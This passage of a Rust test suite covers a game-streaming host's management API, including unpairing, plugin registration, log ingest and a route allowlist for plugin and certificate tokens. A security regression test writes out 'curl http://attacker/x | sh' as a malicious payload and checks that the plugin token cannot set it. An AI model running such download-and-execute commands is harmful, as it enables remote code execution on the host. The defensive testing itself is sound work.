    // not just delist the cert — before this, a mid-stream client kept streaming after unpair
    // until it chose to leave.
    {
        use std::sync::atomic::Ordering;
        // owner_fp is the sha256 of the cert DER — exactly the bytes `fingerprint` encodes.
        let mut owner = [0u8; 32];
        owner.copy_from_slice(&hex::decode(&fingerprint).unwrap());
        state.streaming.store(true, Ordering::SeqCst);
        *state.launch.lock().unwrap() = Some(LaunchSession {
            gcm_key: [0; 16],
            rikeyid: 0,
            width: 1920,
            height: 1080,
            fps: 60,
            appid: 1,
            peer_ip: None,
            owner_fp: Some(owner),
        });
    }

    // Unpair (uppercase hex must match too) → 204, list empties, second delete → 404.
    let del = |fp: String| {
        axum::http::Request::delete(format!("/api/v1/clients/{fp}"))
            .body(Body::empty())
            .unwrap()
    };
    assert_eq!(
        send(&app, del(fingerprint.to_uppercase())).await.0,
        StatusCode::NO_CONTENT
    );
    {
        use std::sync::atomic::Ordering;
        assert!(
            state.launch.lock().unwrap().is_none(),
            "unpair must end the revoked client's live session"
        );
        assert!(!state.streaming.load(Ordering::SeqCst));
        assert!(
            state.quit.load(Ordering::SeqCst),
            "the teardown is deliberate (quit), not a drop"
        );
    }
    let (_, body) = send(&app, get_req("/api/v1/clients")).await;
    assert_eq!(body, serde_json::json!([]));
    assert_eq!(send(&app, del(fingerprint)).await.0, StatusCode::NOT_FOUND);

    // The unpair persisted: paired.json in the (test-scoped) config dir holds the emptied
    // list — a restart must not resurrect the pairing (it would re-open the control port).
    // (`PUNKTFUNK_CONFIG_DIR` is used verbatim — no `punktfunk` subdirectory appended.)
    let disk = std::fs::read(tmp.path().join("paired.json")).expect("unpair persisted paired.json");
    assert_eq!(
        serde_json::from_slice::<Vec<Vec<u8>>>(&disk).unwrap(),
        Vec::<Vec<u8>>::new()
    );

    // ---- the COLLECTION delete: unpair everything at once -----------------------------------
    //
    // Re-seed two clients (the store was just emptied) and clear the teardown flags, so what the
    // bulk delete does to a live session is attributable to IT and not left over from above.
    let second = crate::identity::ephemeral().unwrap();
    let (_, second_pem) = x509_parser::pem::parse_x509_pem(second.cert_pem.as_bytes()).unwrap();
    let second_der = second_pem.contents.clone();
    let second_fp = hex::encode(Sha256::digest(&second_der));
    {
        use std::sync::atomic::Ordering;
        let mut p = state.paired.lock().unwrap();
        p.clear();
        p.push(der.clone());
        p.push(second_der);
        state.quit.store(false, Ordering::SeqCst);
        state.streaming.store(true, Ordering::SeqCst);
        // A live session owned by the SECOND client — the bulk delete must end whichever of the
        // removed certs owns it, not just the first one it happens to walk past.
        let mut owner = [0u8; 32];
        owner.copy_from_slice(&hex::decode(&second_fp).unwrap());
        *state.launch.lock().unwrap() = Some(LaunchSession {
            gcm_key: [0; 16],
            rikeyid: 0,
            width: 1920,
            height: 1080,
            fps: 60,
            appid: 1,
            peer_ip: None,
            owner_fp: Some(owner),
        });
    }

    let del_all = || {
        axum::http::Request::delete("/api/v1/clients")
            .body(Body::empty())
            .unwrap()
    };
    let (status, body) = send(&app, del_all()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["unpaired"], 2, "both clients must be reported removed");

    let (_, body) = send(&app, get_req("/api/v1/clients")).await;
    assert_eq!(body, serde_json::json!([]));
    {
        use std::sync::atomic::Ordering;
        assert!(
            state.launch.lock().unwrap().is_none(),
            "unpair-all must end the live session of any client it revokes"
        );
        assert!(state.quit.load(Ordering::SeqCst));
    }
    // Persisted, for the same reason the single unpair is: a resurrected pairing would re-open
    // the control port on the next boot.
    let disk = std::fs::read(tmp.path().join("paired.json")).unwrap();
    assert_eq!(
        serde_json::from_slice::<Vec<Vec<u8>>>(&disk).unwrap(),
        Vec::<Vec<u8>>::new()
    );

    // Idempotent: emptying an empty store is a 200 with a zero count, NOT the single delete's 404.
    // ("unpair everything" is already satisfied — there is no missing resource to report.)
    let (status, body) = send(&app, del_all()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["unpaired"], 0);
}

#[cfg(feature = "gamestream")]
#[tokio::test]
async fn submit_pin_validates_and_requires_pending_pairing() {
    let app = test_app(test_state(), None);
    let post = |body: &str| {
        axum::http::Request::post("/api/v1/pair/pin")
            .header("content-type", "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    // Malformed PINs → 400.
    assert_eq!(
        send(&app, post(r#"{"pin":""}"#)).await.0,
        StatusCode::BAD_REQUEST
    );
    assert_eq!(
        send(&app, post(r#"{"pin":"12ab"}"#)).await.0,
        StatusCode::BAD_REQUEST
    );

    // Well-formed but nothing waiting → 409 (a parked stale PIN would poison the
    // next pairing attempt).
    assert_eq!(
        send(&app, post(r#"{"pin":"1234"}"#)).await.0,
        StatusCode::CONFLICT
    );

    // axum's own body rejections must still wear the ApiError envelope (ApiJson).
    let (status, body) = send(&app, post("{not json")).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].is_string(), "syntax error: {body}");
    let (status, body) = send(&app, post(r#"{"wrong":"shape"}"#)).await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY);
    assert!(body["error"].is_string(), "schema mismatch: {body}");
    let no_ct = axum::http::Request::post("/api/v1/pair/pin")
        .body(Body::from(r#"{"pin":"1234"}"#))
        .unwrap();
    let (status, body) = send(&app, no_ct).await;
    assert_eq!(status, StatusCode::UNSUPPORTED_MEDIA_TYPE);
    assert!(body["error"].is_string(), "media type: {body}");
}

/// A blank token is treated as no token: the mgmt API requires auth always (even on loopback),
/// so `run` refuses to start unauthenticated rather than serve open.
#[tokio::test]
async fn blank_token_rejected() {
    let opts = Options {
        bind: "127.0.0.1:0".parse().unwrap(),
        token: Some("   ".into()),
        plugin_token: None,
    };
    let err = run(
        test_state(),
        opts,
        None,
        test_stats(),
        false,
        crate::identity::ephemeral().unwrap(),
    )
    .await
    .unwrap_err();
    assert!(err.to_string().contains("no token"), "{err}");
}

#[tokio::test]
async fn stop_session_clears_runtime_state() {
    let state = test_state();
    let app = test_app(state.clone(), None);
    state.streaming.store(true, Ordering::SeqCst);
    state.audio_streaming.store(true, Ordering::SeqCst);
    *state.launch.lock().unwrap() = Some(LaunchSession {
        gcm_key: [0; 16],
        rikeyid: 0,
        width: 1920,
        height: 1080,
        fps: 60,
        appid: 1,
        peer_ip: None,
        owner_fp: None,
    });

    let del = axum::http::Request::delete("/api/v1/session")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, del).await.0, StatusCode::NO_CONTENT);
    assert!(!state.streaming.load(Ordering::SeqCst));
    assert!(!state.audio_streaming.load(Ordering::SeqCst));
    assert!(state.launch.lock().unwrap().is_none());
}

#[tokio::test]
async fn idr_requires_an_active_stream() {
    // A live native session (registered by a sibling test) is an active stream to this route.
    let _serial = SESSION_REGISTRY_LOCK.lock().await;
    let state = test_state();
    let app = test_app(state.clone(), None);
    let post = || {
        axum::http::Request::post("/api/v1/session/idr")
            .body(Body::empty())
            .unwrap()
    };
    assert_eq!(send(&app, post()).await.0, StatusCode::CONFLICT);

    state.streaming.store(true, Ordering::SeqCst);
    assert_eq!(send(&app, post()).await.0, StatusCode::ACCEPTED);
    assert!(state.force_idr.load(Ordering::SeqCst));
}

/// The plugin registry round-trips through the router: register → list (secret-free) → credential
/// (secret present) → deregister. Guards the wiring, auth, and — the security-critical bit — that
/// the UI secret never appears in the browser-visible listing (plugin-ui-surface §7, D6).
#[tokio::test]
async fn plugin_registry_roundtrip() {
    let app = test_app(test_state(), None);
    let id = "test-plugin-roundtrip";
    let secret = "s3cr3t-abcdefghijkl"; // 19 chars, valid [A-Za-z0-9_-]

    // Register with a UI surface → 204.
    let (status, _) = send(
        &app,
        put_json(
            &format!("/api/v1/plugins/{id}"),
            serde_json::json!({
                "title": "Test Plugin",
                "ui": { "port": 49321, "secret": secret, "icon": "gamepad-2" }
            }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    // It lists — and the secret appears NOWHERE in the listing body.
    let (status, body) = send(&app, get_req("/api/v1/plugins")).await;
    assert_eq!(status, StatusCode::OK);
    let mine = body
        .as_array()
        .unwrap()
        .iter()
        .find(|p| p["id"] == id)
        .expect("registered plugin is listed");
    assert_eq!(mine["title"], "Test Plugin");
    assert_eq!(mine["ui"]["port"], 49321);
    assert_eq!(mine["ui"]["icon"], "gamepad-2");
    assert!(
        !body.to_string().contains(secret),
        "the listing must never carry the UI secret"
    );

    // The credential endpoint (server-side proxy lookup) DOES carry it.
    let (status, body) = send(
        &app,
        get_req(&format!("/api/v1/plugins/{id}/ui-credential")),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["secret"], secret);
    assert_eq!(body["port"], 49321);

    // Deregister → gone from the listing, credential 404s.
    let (status, _) = send(
        &app,
        axum::http::Request::delete(format!("/api/v1/plugins/{id}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (_, body) = send(&app, get_req("/api/v1/plugins")).await;
    assert!(
        body.as_array().unwrap().iter().all(|p| p["id"] != id),
        "deregistered plugin must not list"
    );
    let (status, _) = send(
        &app,
        get_req(&format!("/api/v1/plugins/{id}/ui-credential")),
    )
    .await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    // A structurally invalid registration is a 400 (privileged port).
    let (status, _) = send(
        &app,
        put_json(
            &format!("/api/v1/plugins/{id}"),
            serde_json::json!({ "title": "x", "ui": { "port": 80, "secret": secret } }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

/// Runner log ingest: lines reach the same ring `GET /logs` serves, tagged so the console can tell
/// them from the host's own, and one chatty plugin can't evict the ring in a single request.
#[tokio::test]
async fn plugin_log_ingest_lands_in_the_ring() {
    let app = test_app(test_state(), None);
    let marker = "vh-ingest-marker-3f9a";

    let (status, _) = send(
        &app,
        post_json(
            "/api/v1/plugins/logs",
            serde_json::json!({"entries": [
                {"ts_ms": 1_700_000_000_123u64, "level": "warn", "source": "virtualhere", "msg": marker},
                // No source: attributed to the runner rather than to nothing.
                {"ts_ms": 1_700_000_000_124u64, "level": "NOTICE", "source": "", "msg": "orphan"},
            ]}),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (status, body) = send(&app, get_req("/api/v1/logs?limit=1000")).await;
    assert_eq!(status, StatusCode::OK);
    let entries = body["entries"].as_array().unwrap();

    let mine = entries
        .iter()
        .find(|e| e["msg"] == marker)
        .expect("ingested line is served by GET /logs");
    // `plugin:` is what the console's Host/Plugins filter keys on.
    assert_eq!(mine["target"], "plugin:virtualhere");
    // Lowercase in, canonical out — the console ranks these five and nothing else.
    assert_eq!(mine["level"], "WARN");
    // Stamped when the line happened, not when the batch arrived.
    assert_eq!(mine["ts_ms"], 1_700_000_000_123u64);

    let orphan = entries.iter().find(|e| e["msg"] == "orphan").unwrap();
    assert_eq!(orphan["target"], "plugin:runner");
    // An unranked level would sort as 0 in the console's filter and hide under every setting.
    assert_eq!(orphan["level"], "INFO");

    // An oversized batch is refused whole rather than half-ingested.
    let big: Vec<serde_json::Value> = (0..300)
        .map(|i| serde_json::json!({"ts_ms": 1u64, "level": "INFO", "source": "x", "msg": format!("f{i}")}))
        .collect();
    let (status, _) = send(
        &app,
        post_json("/api/v1/plugins/logs", serde_json::json!({"entries": big})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

/// **The plugin lane reaches the library writes but cannot make them run a command** — the H-1 fix.
///
/// A provider plugin must be able to reconcile its own entry set, so the ROUTE stays open to it.
/// What is refused is the pair of fields inside the payload that the host later executes verbatim as
/// the host user (`/bin/sh -c` on Linux, `cmd.exe /c` on Windows): `prep`, and a `command` launch.
/// Those are the operator's authority, and the whole trust argument at their execution sites is that
/// a human typed them into the admin console.
#[tokio::test]
async fn plugin_lane_cannot_set_command_execution_fields() {
    let app = test_app(test_state(), None); // admin "test-secret", plugin "plugin-secret"

    let as_lane = |token: &str, method: &str, path: &str, body: serde_json::Value| {
        axum::http::Request::builder()
            .method(method)
            .uri(path)
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {token}"))
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    // The two shapes of the primitive, on the two routes that carry it.
    let prep = serde_json::json!({
        "title": "Pwned",
        "prep": [{"do": "curl http://attacker/x | sh"}],
    });
    let command = serde_json::json!({
        "title": "Pwned",
        "launch": {"kind": "command", "value": "curl http://attacker/x | sh"},
    });
    for (path, method) in [
        ("/api/v1/library/custom", "POST"),
        ("/api/v1/library/custom/some-id", "PUT"),
    ] {
        for body in [&prep, &command] {
            let (status, err) =
                send(&app, as_lane("plugin-secret", method, path, body.clone())).await;
            assert_eq!(
                status,
                StatusCode::FORBIDDEN,
                "plugin token must not set an executed field via {method} {path}"
            );
            assert!(
                err["error"].as_str().unwrap().contains("host user"),
                "the refusal should say why: {err}"
            );
        }
    }
    // The reconcile route replaces a WHOLE entry set, so every entry is checked — not just the
    // first. A payload that hides the primitive behind a benign leading entry is still refused.
    let sneaky = serde_json::json!([
        {"external_id": "a", "title": "Innocent"},
        {"external_id": "b", "title": "Pwned",
         "launch": {"kind": "command", "value": "curl http://attacker/x | sh"}},
    ]);
    let (status, _) = send(
        &app,
        as_lane(
            "plugin-secret",
            "PUT",
            "/api/v1/library/provider/romm",
            sneaky,
        ),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "a privileged field anywhere in a reconcile payload must be refused"
    );

    // Every refusal above happens BEFORE the catalog is touched, so this test never writes to the
    // host config dir. The converse — that the operator's own lane may set these fields, and that a
    // plugin's ordinary catalogue is unaffected — is `library::tests::privileged_field_is_command_
    // execution_only`, which needs no filesystem either.
    assert!(
        crate::mgmt::auth::AuthLane::Admin.may_set_privileged_fields(),
        "the operator's token is the lane these fields belong to"
    );
    assert!(!crate::mgmt::auth::AuthLane::Plugin.may_set_privileged_fields());
    assert!(!crate::mgmt::auth::AuthLane::Cert.may_set_privileged_fields());
}

/// **Every route in the live table is explicitly classified for both non-admin lanes.**
///
/// This is the test whose absence produced H-1 and H-2 in the 2026-08-05 review. `plugin_may_access`
/// used to be a denylist, so a route added after the list was written was granted to the plugin
/// token silently and no test failed — which is exactly how `/api/v1/library`'s two copies of the
/// command-execution primitive, and the unconfined art proxy, ended up on the plugin lane across
/// ~1450 commits.
///
/// The gate is an allowlist now, so the failure mode has flipped: a new route is DENIED until it is
/// classified. This test makes that classification a conscious, reviewed act rather than a silent
/// default in either direction — adding a route fails the build until its row is added here, and the
/// row is where a reviewer looks to ask "should a plugin really reach this?".
#[test]
fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
    use axum::http::Method;

    // (method, path template, plugin token may reach, paired streaming cert may reach).
    // EXHAUSTIVE over the live route table — no wildcards, no prefixes, one row per operation.
    const EXPECTED: &[(&str, &str, bool, bool)] = &[
        // ---- host / status: readable by a plugin; the small read-only set is the cert lane's.
        ("GET", "/api/v1/health", true, false), // always open, handled before either gate
        ("GET", "/api/v1/host", true, true),
        ("GET", "/api/v1/status", true, true),
        ("GET", "/api/v1/local/summary", true, false), // loopback-only, handled before the gates
        ("GET", "/api/v1/compositors", true, true),
        ("GET", "/api/v1/events", true, false),
        ("GET", "/api/v1/logs", true, false),
        // ---- client log bundles: the UPLOAD is the cert lane's single write — write-only,
        // size/quota-capped ("send logs to host" from a Deck in Gaming Mode / tvOS). Reading
        // bundles back is operator business (they can contain whatever the client logged), so
        // list/fetch/delete stay bearer-only in both lanes.
        ("POST", "/api/v1/client-logs", false, true),
        ("GET", "/api/v1/client-logs", false, false),
        ("GET", "/api/v1/client-logs/{id}", false, false),
        ("DELETE", "/api/v1/client-logs/{id}", false, false),
        // ---- paired-device rosters: readable by a plugin, never by another paired client, and
        // removal is pairing administration in both lanes.
        ("GET", "/api/v1/clients", true, false),
        // The bulk form is the same authority as the single one — and, sharing its path with a
        // plugin-readable GET, worth an explicit row: both gates match on (method, path), so the
        // roster's read permission must never carry over to emptying it.
        ("DELETE", "/api/v1/clients", false, false),
        ("DELETE", "/api/v1/clients/{fingerprint}", false, false),
        ("GET", "/api/v1/native/clients", true, false),
        ("DELETE", "/api/v1/native/clients", false, false),
        (
            "DELETE",
            "/api/v1/native/clients/{fingerprint}",
            false,
            false,
        ),
        // Editing a device's grants/expiry is pairing administration in both lanes: a plugin
        // must not widen (or cut) another device's access, and a paired client even less so.
        (
            "PATCH",
            "/api/v1/native/clients/{fingerprint}",
            false,
            false,
        ),
        // ---- pairing administration + PIN visibility: the operator's token alone.
        ("GET", "/api/v1/pair", false, false),
        ("POST", "/api/v1/pair/pin", false, false),
        ("GET", "/api/v1/native/pair", false, false),
        ("DELETE", "/api/v1/native/pair", false, false),
        ("POST", "/api/v1/native/pair/arm", false, false),
        ("GET", "/api/v1/native/pending", false, false),
        ("POST", "/api/v1/native/pending/{id}/approve", false, false),
        ("POST", "/api/v1/native/pending/{id}/deny", false, false),
        // ---- GPU + display: host configuration, no privilege boundary.
        ("GET", "/api/v1/gpus", true, false),
        ("PUT", "/api/v1/gpus/preference", true, false),
        ("GET", "/api/v1/display/settings", true, false),
        ("PUT", "/api/v1/display/settings", true, false),
        ("GET", "/api/v1/display/state", true, false),
        ("GET", "/api/v1/display/monitors", true, false),
        ("PUT", "/api/v1/display/layout", true, false),
        ("POST", "/api/v1/display/release", true, false),
        ("GET", "/api/v1/display/presets", true, false),
        ("POST", "/api/v1/display/presets", true, false),
        ("PUT", "/api/v1/display/presets/{id}", true, false),
        ("DELETE", "/api/v1/display/presets/{id}", true, false),
        // ---- session control.
        ("DELETE", "/api/v1/session", true, false),
        ("POST", "/api/v1/session/idr", true, false),
        ("GET", "/api/v1/session/settings", true, false),
        ("PUT", "/api/v1/session/settings", true, false),
        ("POST", "/api/v1/game/end", true, false),
        // ---- library. The plugin lane reaches the writes (a scanner plugin's whole job), but the
        // operator-privileged FIELDS inside those payloads are refused in the handler — see
        // `plugin_lane_cannot_set_command_execution_fields`.
        ("GET", "/api/v1/library", true, true),
        ("GET", "/api/v1/library/art/{id}/{kind}", true, true),
        ("GET", "/api/v1/library/scanners", true, false),
        ("PUT", "/api/v1/library/scanners/{id}", true, false),
        // Hiding a title is the OPERATOR curating their own library: a plugin has no business
        // deciding what the operator sees, and a paired client must not be able to hide a game on
        // the host it is streaming from. Neither lane, unlike the scanner toggle above.
        ("PUT", "/api/v1/library/hidden/{id}", false, false),
        ("POST", "/api/v1/library/custom", true, false),
        ("PUT", "/api/v1/library/custom/{id}", true, false),
        ("DELETE", "/api/v1/library/custom/{id}", true, false),
        ("PUT", "/api/v1/library/provider/{provider}", true, false),
        ("DELETE", "/api/v1/library/provider/{provider}", true, false),
        // ---- stats.
        ("POST", "/api/v1/stats/capture/start", true, false),
        ("POST", "/api/v1/stats/capture/stop", true, false),
        ("GET", "/api/v1/stats/capture/status", true, false),
        ("GET", "/api/v1/stats/capture/live", true, false),
        ("GET", "/api/v1/stats/recordings", true, false),
        ("GET", "/api/v1/stats/recordings/{id}", true, false),
        ("DELETE", "/api/v1/stats/recordings/{id}", true, false),
        // ---- plugins: its own directory entry and log ingest, never another plugin's UI secret.
        ("GET", "/api/v1/plugins", true, false),
        ("POST", "/api/v1/plugins/logs", true, false),
        ("PUT", "/api/v1/plugins/{id}", true, false),
        ("DELETE", "/api/v1/plugins/{id}", true, false),
        ("GET", "/api/v1/plugins/{id}/ui-credential", false, false),
        // ---- hooks: writing is command execution as the host user; reading exposes webhook creds.
        ("GET", "/api/v1/hooks", false, false),
        ("PUT", "/api/v1/hooks", false, false),
        // ---- the store: installing a plugin runs new code with operator privileges.
        ("GET", "/api/v1/store/catalog", false, false),
        ("POST", "/api/v1/store/refresh", false, false),
        ("GET", "/api/v1/store/installed", false, false),
        ("POST", "/api/v1/store/install", false, false),
        ("POST", "/api/v1/store/uninstall", false, false),
        ("GET", "/api/v1/store/jobs", false, false),
        ("GET", "/api/v1/store/jobs/{id}", false, false),
        ("GET", "/api/v1/store/sources", false, false),
        ("PUT", "/api/v1/store/sources/{name}", false, false),
        ("DELETE", "/api/v1/store/sources/{name}", false, false),
        ("GET", "/api/v1/store/runtime", false, false),
        ("POST", "/api/v1/store/runtime", false, false),
        // ---- updates: `apply` runs an installer / the root helper.
        ("GET", "/api/v1/update/status", false, false),
        ("POST", "/api/v1/update/check", false, false),
        ("POST", "/api/v1/update/apply", false, false),
    ];

    /// A path template's concrete form: every `{param}` segment becomes a literal, so the gates
    /// are exercised on the shape a real request has.
    fn concrete(template: &str) -> String {
        template
            .split('/')
            .map(|s| if s.starts_with('{') { "sample" } else { s })
            .collect::<Vec<_>>()
            .join("/")
    }

    // The GameStream PIN routes exist only in gamestream-featured builds (WP19) — drop their
    // rows from the expectation when the feature is off (`cfg!` keeps both sides type-checked).
    let expected: Vec<(&str, &str, bool, bool)> = EXPECTED
        .iter()
        .copied()
        .filter(|(_, p, _, _)| {
            cfg!(feature = "gamestream") || !matches!(*p, "/api/v1/pair" | "/api/v1/pair/pin")
        })
        .collect();
    let doc: serde_json::Value = serde_json::from_str(&openapi_json()).unwrap();
    let mut live: Vec<(String, String)> = Vec::new();
    for (path, ops) in doc["paths"].as_object().unwrap() {
        for method in ops.as_object().unwrap().keys() {
            if matches!(method.as_str(), "get" | "post" | "put" | "delete" | "patch") {
                live.push((method.to_uppercase(), path.clone()));
            }
        }
    }

    // 1. Every LIVE route has a classification row. A new route fails here until it gets one.
    for (method, path) in &live {
        assert!(
            expected.iter().any(|(m, p, _, _)| m == method && p == path),
            "route {method} {path} has no lane classification — add a row to EXPECTED in this test \
             and decide, deliberately, whether the plugin token and a paired streaming cert may \
             reach it"
        );
    }
    // 2. No STALE rows: a removed route must not leave a classification behind claiming coverage.
    for (method, path, _, _) in &expected {
        assert!(
            live.iter().any(|(m, p)| m == method && p == path),
            "EXPECTED lists {method} {path}, which is not in the live route table — remove the row"
        );
    }
    // 3. The gates agree with the classification, on both lanes.
    for (method, path, plugin_ok, cert_ok) in &expected {
        let m = Method::from_bytes(method.as_bytes()).unwrap();
        let concrete = concrete(path);
        assert_eq!(
            auth::plugin_may_access(&m, &concrete),
            *plugin_ok,
            "plugin lane: {method} {path} should be {}",
            if *plugin_ok { "reachable" } else { "denied" }
        );
        assert_eq!(
            auth::cert_may_access(&m, &concrete),
            *cert_ok,
            "cert lane: {method} {path} should be {}",
            if *cert_ok { "reachable" } else { "denied" }
        );
    }
}

/// The allowlist is segment-wise, so a route that merely *starts with* an allowed one is not
/// swallowed by it — the failure that a `starts_with` denylist/allowlist invites.
#[test]
fn plugin_allowlist_matches_whole_segments_only() {
    use axum::http::Method;
    // The UI credential sits one segment below an allowed route and must stay denied.
    assert!(auth::plugin_may_access(
        &Method::PUT,
        "/api/v1/plugins/rom-manager"
    ));
    assert!(!auth::plugin_may_access(
        &Method::GET,
        "/api/v1/plugins/rom-manager/ui-credential"
    ));
    // A hypothetical future sub-route of an allowed route is denied until classified.
    assert!(!auth::plugin_may_access(
        &Method::GET,
        "/api/v1/library/secrets"
    ));
    assert!(!auth::plugin_may_access(
        &Method::POST,
        "/api/v1/session/settings/x"
    ));
    // Method matters: the roster is readable, its removal is not.
    assert!(auth::plugin_may_access(&Method::GET, "/api/v1/clients"));
    assert!(!auth::plugin_may_access(
        &Method::DELETE,
        "/api/v1/clients/aabbcc"
    ));
    // A path prefix that is not a segment prefix must not match at all.
    assert!(!auth::plugin_may_access(&Method::GET, "/api/v1/statuses"));
    assert!(!auth::plugin_may_access(
        &Method::GET,
        "/api/v1/library-secrets"
    ));
}

/// The OpenAPI document lists every route with a unique operationId (codegen relies
/// on both), and the checked-in copy is current. Feature-gated: `api/openapi.json` IS the
/// default-features document — a native-only build's spec (no PIN routes) is intentionally
/// different and not checked in (WP19).
#[cfg(feature = "gamestream")]
#[test]
fn openapi_document_is_complete_and_checked_in() {
    let json = openapi_json();
    let doc: serde_json::Value = serde_json::from_str(&json).unwrap();

    let paths = doc["paths"].as_object().unwrap();
    for p in [
        "/api/v1/health",
        "/api/v1/host",
        "/api/v1/status",
        "/api/v1/clients",
        "/api/v1/clients/{fingerprint}",
        "/api/v1/pair",
        "/api/v1/pair/pin",
        "/api/v1/session",
        "/api/v1/session/idr",
    ] {
        assert!(paths.contains_key(p), "spec is missing {p}");
    }

    let mut op_ids: Vec<&str> = paths
        .values()
        .flat_map(|ops| ops.as_object().unwrap().values())
        .filter_map(|op| op["operationId"].as_str())
        .collect();
    let total = op_ids.len();
    op_ids.sort_unstable();
    op_ids.dedup();
    assert_eq!(total, op_ids.len(), "duplicate operationIds");
    assert!(doc["components"]["securitySchemes"]["bearerAuth"].is_object());
    // The health probe overrides the document-global bearer requirement (the server
    // exempts it in `require_auth`; the spec must agree).
    assert_eq!(
        doc["paths"]["/api/v1/health"]["get"]["security"],
        serde_json::json!([{}])
    );

    let checked_in = include_str!("../../../../api/openapi.json");
    // Compare STRUCTURALLY with `info.version` normalized on both sides: the served document
    // stamps the live crate version, but a version bump alone must never invalidate the
    // snapshot — the API *surface* is what drift-control protects (the 0.5.0 release tripped
    // on exactly this). Structural comparison also makes line endings a non-issue (git may
    // check the file out CRLF on Windows).
    let mut generated = doc;
    let mut snapshot: serde_json::Value = serde_json::from_str(checked_in).unwrap();
    generated["info"]["version"] = serde_json::json!("<any>");
    snapshot["info"]["version"] = serde_json::json!("<any>");
    assert_eq!(
        generated, snapshot,
        "api/openapi.json is stale — regenerate with: \
         cargo run -p punktfunk-host -- openapi > api/openapi.json"
    );
}

fn post_json(path: &str, body: serde_json::Value) -> axum::http::Request<Body> {
    axum::http::Request::post(path)
        .header("content-type", "application/json")
        .body(Body::from(body.to_string()))
        .unwrap()
}

/// The display-management GET surface (presets + effective + the enforced-axes list). READ-ONLY
/// on purpose: `prefs()` is a process-global `OnceLock`, so a PUT here would clobber it and race
/// other tests running in the same process. `keep_alive: forever` (gaming-rig) is now accepted
/// (not rejected) — that acceptance is covered on-glass (`.116`) + by the pure `policy` tests, and
/// the `forever` value is read off the surfaced preset below without writing.
#[tokio::test]
async fn display_settings_surface() {
    let app = test_app(test_state(), None);

    let (status, body) = send(&app, get_req("/api/v1/display/settings")).await;
    assert_eq!(status, StatusCode::OK);
    let presets = body["presets"].as_array().expect("presets array");
    assert_eq!(
        presets.len(),
        5,
        "all five named presets are surfaced for the console picker"
    );
    assert!(
        body["effective"]["keep_alive"].is_object(),
        "the effective policy is echoed"
    );
    // gaming-rig surfaces keep_alive: forever (no longer rejected) — read it off the preset list.
    let gaming = presets
        .iter()
        .find(|p| p["id"] == "gaming-rig")
        .expect("gaming-rig preset surfaced");
    assert_eq!(
        gaming["fields"]["keep_alive"]["mode"], "forever",
        "gaming-rig is keep_alive: forever"
    );
    let enforced: Vec<&str> = body["enforced"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|v| v.as_str())
        .collect();
    // All five axes are enforced now (Stages 0-5).
    assert!(enforced.contains(&"keep_alive"));
    assert!(enforced.contains(&"topology"));
    assert!(enforced.contains(&"mode_conflict"));
    assert!(enforced.contains(&"identity"));
    assert!(enforced.contains(&"layout"));
    // The experimental DDC/CI + PnP-disable + EDID-lock axes are acted on (Windows
    // exclusive-isolate path; edid_lock additionally needs an AMD driver to do anything).
    assert!(enforced.contains(&"ddc_power_off"));
    assert!(enforced.contains(&"pnp_disable_monitors"));
    assert!(enforced.contains(&"edid_lock"));
}

/// The display state/release endpoints are wired + auth-gated. On the test host no backend has
/// created a display (and non-Windows reports none), so `/state` is empty and `/release` is a
/// no-op — the shapes + the "nothing to release" path, without touching any global owner.
#[tokio::test]
async fn display_state_and_release_empty() {
    let app = test_app(test_state(), None);

    let (status, body) = send(&app, get_req("/api/v1/display/state")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        body["displays"].as_array().map(|a| a.len()),
        Some(0),
        "no managed displays on an idle test host"
    );

    let (status, body) = send(
        &app,
        post_json("/api/v1/display/release", serde_json::json!({})),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["released"], 0);
}

/// `/display/monitors` is wired, auth-gated, and — the point of the test — **always answers 200
/// with a well-formed envelope**, including on a test host with no compositor to enumerate. The
/// console renders a picker from this; an enumeration failure has to arrive as an `error` string
/// next to an empty list, never as a 5xx that reads to the UI as "the host is broken".
#[tokio::test]
async fn display_monitors_answers_even_with_no_compositor() {
    let app = test_app(test_state(), None);

    let (status, body) = send(&app, get_req("/api/v1/display/monitors")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["monitors"].is_array(), "monitors is always an array");
    // No compositor on the test host ⇒ either a clean empty list or an explained failure, never
    // both empty AND silent about why.
    let listed = body["monitors"].as_array().map(|a| a.len()).unwrap_or(0);
    // gamescope is nested: it owns no physical heads by construction, so "empty and silent" is the
    // correct answer there, not an unexplained one. A dev box that has ever been in game mode keeps
    // `gamescope-0` sockets in its runtime dir, so `detect()` resolves gamescope and this test would
    // otherwise fail on the machine rather than on the code (found running the suite on .136).
    let nested = body["compositor"] == "gamescope";
    assert!(
        listed > 0 || !body["error"].is_null() || body["compositor"].is_null() || nested,
        "an empty list must carry an error, an absent compositor, or a nested one: {body}"
    );
    // The pin is reported verbatim so the console can flag "pinned to a monitor you don't have";
    // unset on the test host.
    assert!(body["pinned"].is_null(), "no PUNKTFUNK_CAPTURE_MONITOR set");
}

#[tokio::test]
async fn native_pairing_arm_show_and_unpair() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-np-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    // Disarmed: enabled, not armed, no PIN.
    let (s, b) = send(&app, get_req("/api/v1/native/pair")).await;
